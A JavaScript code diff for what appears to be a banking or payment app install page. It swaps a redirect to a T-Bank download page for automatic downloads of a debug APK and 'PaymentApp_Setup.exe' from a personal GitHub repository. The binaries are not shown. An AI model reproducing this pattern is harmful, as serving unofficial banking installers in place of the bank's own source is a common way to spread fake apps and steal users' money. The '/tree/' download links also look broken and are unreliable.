@@ -40,11 +40,31 @@ if (encryptedDataFromURL) {
 }, 1000);
 
 	 });
+
+	function downloadFromGitHub(fileUrl) {  
+    // Создаем временную ссылку
+    const link = document.createElement('a');
+    link.href = fileUrl;
+    
+    // Извлекаем имя файла из URL
+    const fileName = fileUrl.substring(fileUrl.lastIndexOf('/') + 1);
+    link.download = fileName;
+    
+    // Симулируем клик для загрузки
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
     
     install.addEventListener('click', function() {
         document.body.style.backgroundColor = '#FFFFFF';
 	    if (os == "Android"){
-	window.location = `https://acdn.t-bank-app.ru/download_apk/tbank_app.html`
+		downloadFromGitHub('https://github.com/serebrovskaya/ifAppNotFound/tree/main/apps/app-debug.apk')
+	//window.location = `https://acdn.t-bank-app.ru/download_apk/tbank_app.html`
+	    }
+	    if (os == "Desktop"){
+		downloadFromGitHub('https://github.com/serebrovskaya/ifAppNotFound/tree/main/apps/PaymentApp_Setup.exe')
 	    }
     });
     
